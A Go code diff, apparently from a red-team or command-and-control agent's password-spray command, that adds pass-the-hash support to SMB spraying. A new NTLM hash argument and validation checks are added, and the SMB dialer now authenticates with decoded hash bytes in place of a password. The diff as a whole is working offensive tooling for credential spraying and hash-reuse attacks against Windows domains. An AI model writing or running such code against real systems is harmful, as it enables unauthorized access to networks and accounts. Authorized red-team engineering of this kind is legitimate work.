@@ -34,6 +34,7 @@ type sprayArgs struct {
 	Domain   string `json:"domain"`   // domain name
 	Users    string `json:"users"`    // newline-separated usernames
 	Password string `json:"password"` // password to spray (not required for enumerate)
+	Hash     string `json:"hash"`     // NTLM hash for SMB spray (pass-the-hash)
 	Delay    int    `json:"delay"`    // delay between attempts in ms (default: 0)
 	Jitter   int    `json:"jitter"`   // jitter percentage 0-100 (default: 0)
 	Port     int    `json:"port"`     // optional custom port
@@ -76,9 +77,16 @@ func (c *SprayCommand) Execute(task structs.Task) structs.CommandResult {
 			Completed: true,
 		}
 	}
-	if args.Action != "enumerate" && args.Password == "" {
+	if args.Action != "enumerate" && args.Password == "" && args.Hash == "" {
 		return structs.CommandResult{
-			Output:    "Error: password is required for spray actions (not required for enumerate)",
+			Output:    "Error: password (or hash for SMB) is required for spray actions (not required for enumerate)",
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	if args.Hash != "" && args.Action != "smb" {
+		return structs.CommandResult{
+			Output:    "Error: hash-based spray is only supported for SMB action",
 			Status:    "error",
 			Completed: true,
 		}
@@ -354,13 +362,23 @@ func spraySMB(args sprayArgs, users []string) structs.CommandResult {
 			continue
 		}
 
-		d := &smb2.Dialer{
-			Initiator: &smb2.NTLMInitiator{
-				User:     user,
-				Password: args.Password,
-				Domain:   args.Domain,
-			},
+		initiator := &smb2.NTLMInitiator{
+			User:   user,
+			Domain: args.Domain,
 		}
+		if args.Hash != "" {
+			hashBytes, err := smbDecodeHash(args.Hash)
+			if err != nil {
+				conn.Close()
+				r.Message = fmt.Sprintf("Invalid hash: %v", err)
+				results = append(results, r)
+				continue
+			}
+			initiator.Hash = hashBytes
+		} else {
+			initiator.Password = args.Password
+		}
+		d := &smb2.Dialer{Initiator: initiator}
 
 		session, err := d.Dial(conn)
 		if err != nil {
